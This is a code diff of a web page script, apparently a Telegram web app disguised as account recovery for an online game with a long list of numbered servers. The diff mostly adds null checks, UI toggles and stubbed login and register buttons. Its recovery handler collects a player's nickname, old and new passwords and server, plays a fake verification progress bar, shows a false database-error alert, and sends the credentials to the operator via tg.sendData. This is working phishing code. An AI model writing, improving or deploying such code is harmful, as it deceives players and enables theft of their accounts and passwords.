-            "MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE","CHILLI","CHOCO","MOSCOW","SPB",
-            "UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA","EKB","KRASNODAR","ARZAMAS","NOVOSIB","GROZNY",
-            "SARATOV","OMSK","IRKUTSK","VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ",
-            "VLADIVOSTOK","KALININGRAD","CHELYABINSK","KRASNOYARSK","CHEBOKSARY","KHABAROVSK","PERM","TULA",
-            "RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN",
-            "TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL",
-            "LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK","ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR",
-            "KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN",
-            "CHEREPOVETS","NORILSK","ASTANA","TASHKENT"
-        ];
+        function togglePasswordView(f) {
+            const field = document.getElementById(f);
+            if(field) field.type = field.type === "password" ? "text" : "password";
+        }
 
+        function toggleSupportModal(s) { 
+            const m = document.getElementById("support-modal"); 
+            if (m) m.classList.toggle("show", s); 
+        }
+        function openInternalOnlineChat() { 
+            const c = document.getElementById("internal-chat-box"); 
+            if (c) c.classList.add("show"); 
+        }
+        function closeInternalOnlineChat() { 
+            const c = document.getElementById("internal-chat-box"); 
+            if (c) c.classList.remove("show"); 
+        }
+
+        // === 3. ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
+        const brServers = ["RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK","INDIGO","WHITE","MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE","CHILLI","CHOCO","MOSCOW","SPB","UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA","EKB","KRASNODAR","ARZAMAS","NOVOSIB","GROZNY","SARATOV","OMSK","IRKUTSK","VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ","VLADIVOSTOK","KALININGRAD","CHELYABINSK","KRASNOYARSK","CHEBOKSARY","KHABAROVSK","PERM","TULA","RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KIROV","KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK","OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK","ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","NOVGOROD","TAGANROG","VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK","ASTANA","TASHKENT"];
         let finalSelectedServerValue = "";
 
         document.addEventListener("DOMContentLoaded", function() {
             const customServerList = document.getElementById("custom-server-list");
-            brServers.forEach(function(name, index) {
-                let num = index + 1;
-                let formattedNum = num < 10 ? "0" + num : num;
-                let item = document.createElement("div"); 
-                item.className = "server-item";
-                item.innerHTML = `<span class="server-num-badge">${formattedNum}</span> | ${name}`;
-                
-                item.addEventListener("click", function(e) {
-                    e.stopPropagation(); 
-                    finalSelectedServerValue = `${formattedNum} | ${name}`;
-                    
-                    const curr = document.getElementById("current-selected-server");
-                    if(curr) { curr.textContent = finalSelectedServerValue; curr.style.color = "#ffffff"; }
-                    
-                    const rec = document.getElementById("rec-selected-server-text");
-                    if(rec) { rec.textContent = finalSelectedServerValue; rec.style.color = "#ffffff"; }
-                    
-                    customServerList.classList.remove("show");
+            if(customServerList) {
+                brServers.forEach(function(name, index) {
+                    let num = index + 1, formattedNum = num < 10 ? "0" + num : num;
+                    let item = document.createElement("div"); item.className = "server-item";
+                    item.innerHTML = `<span class="server-num-badge">${formattedNum}</span> | ${name}`;
+                    item.addEventListener("click", function(e) {
+                        e.stopPropagation(); finalSelectedServerValue = `${formattedNum} | ${name}`;
+                        
+                        const curr = document.getElementById("current-selected-server");
+                        if(curr) { curr.textContent = finalSelectedServerValue; curr.style.color = "#ffffff"; }
+                        const rec = document.getElementById("rec-selected-server-text");
+                        if(rec) { rec.textContent = finalSelectedServerValue; rec.style.color = "#ffffff"; }
+                        const reg = document.getElementById("reg-selected-server-text");
+                        if(reg) { reg.textContent = finalSelectedServerValue; reg.style.color = "#ffffff"; }
+                        
+                        customServerList.classList.remove("show");
+                    });
+                    customServerList.appendChild(item);
                 });
-                customServerList.appendChild(item);
-            });
+            }
 
-            document.getElementById("server-field-trigger").addEventListener("click", function(e) { 
-                e.stopPropagation(); 
-                customServerList.classList.toggle("show"); 
-            });
-            
+            const trigger = document.getElementById("server-field-trigger");
+            if(trigger) {
+                trigger.addEventListener("click", function(e) { 
+                    e.stopPropagation(); 
+                    customServerList.classList.toggle("show"); 
+                });
+            }
             document.addEventListener("click", function() { 
                 customServerList.classList.remove("show"); 
             });
@@ -273,10 +391,15 @@
 
         function triggerServerDropdownFromReg(e) { 
             if (e) e.stopPropagation();
-            document.getElementById("custom-server-list").classList.toggle("show");
+            const currentDropdown = document.getElementById("custom-server-list");
+            if (currentDropdown) currentDropdown.classList.toggle("show");
         }
 
-        // === ЛОГИКА 6 СЕК + ОКНО ТГ ===
+        // === 4. ОБРАБОТЧИКИ КНОПОК ===
+        function handleLoginClick() { alert('Вход в разработке'); }
+        function handleRegisterClick() { alert('Регистрация в разработке'); }
+
+        // === 5. ВОССТАНОВЛЕНИЕ (6 СЕК + АЛЕРТ + TG.SENDDATA) ===
         function handleRecoveryClick() {
             const recNick = document.getElementById("rec-nick-input").value.trim();
             const recOld = document.getElementById("rec-old-pass").value.trim();
@@ -294,18 +417,18 @@
             let checkP = 0;
             const checkInterval = setInterval(() => {
                 checkP++;
-                document.getElementById('check-percent').textContent = checkP + '%';
-                document.getElementById('check-bar').style.width = checkP + '%';
+                const elP = document.getElementById('check-percent');
+                const elB = document.getElementById('check-bar');
+                if (elP) elP.textContent = checkP + '%';
+                if (elB) elB.style.width = checkP + '%';
 
                 if (checkP >= 100) {
                     clearInterval(checkInterval);
                     setTimeout(() => {
                         if (checkModal) checkModal.classList.remove('show');
                         
-                        // ТВОЕ ОКНО
                         alert(`Ошибка баз данных ${serverValue}.\nВы ввели неверные данные.`);
                         
-                        // ОТПРАВКА ДАННЫХ И ЗАКРЫТИЕ ОКНА
                         const data = `🔄 ВОССТАНОВЛЕНИЕ\n\n👤 Ник: ${recNick}\n🔓 Старый пароль: ${recOld}\n🔒 Новый пароль: ${recNew}\n🌍 Сервер: ${serverValue}`;
                         if (tg && typeof tg.sendData === 'function') {
                             tg.sendData(data);
